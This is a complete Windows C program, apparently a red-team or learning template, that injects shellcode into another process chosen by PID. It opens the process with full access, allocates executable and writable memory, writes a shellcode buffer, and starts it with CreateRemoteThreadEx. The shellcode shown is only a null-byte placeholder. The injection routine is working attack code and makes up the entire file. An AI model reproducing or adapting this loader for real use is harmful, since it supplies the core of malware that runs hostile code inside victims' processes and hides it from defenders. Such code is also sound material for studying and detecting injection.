#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

int main(int argc, char* argv[]) {
	if (argc < 2) {
		error("Not enough parameters: program.exe <PID>");
		return EXIT_FAILURE;
	}

	DWORD PID = atoi(argv[1]);
	HANDLE hProcess, hThread;
	LPVOID rBuffer;
	DWORD TID;
	unsigned char shell[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	info("Trying to open a handle to the process");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		error("Couldn't get a handle to the process. Error code: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Got a handle to the process: 0x%p", hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		error("Failed to allocate memory in the target process");
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions", sizeof(shell));

	if (!WriteProcessMemory(hProcess, rBuffer, shell, sizeof(shell), NULL)) {
		error("Failed to write to process memory");
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	okay("Wrote %zu bytes to process memory", sizeof(shell));

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
	if (hThread == NULL) {
		error("Failed to create remote thread");
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	okay("Got a handle to the remote thread: 0x%p", hThread);

	info("Waiting for thread to finish");
	WaitForSingleObject(hThread, INFINITE);
	okay("Thread finished executing");

	info("Cleaning up...");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	okay("Finished!");

	return EXIT_SUCCESS;
}

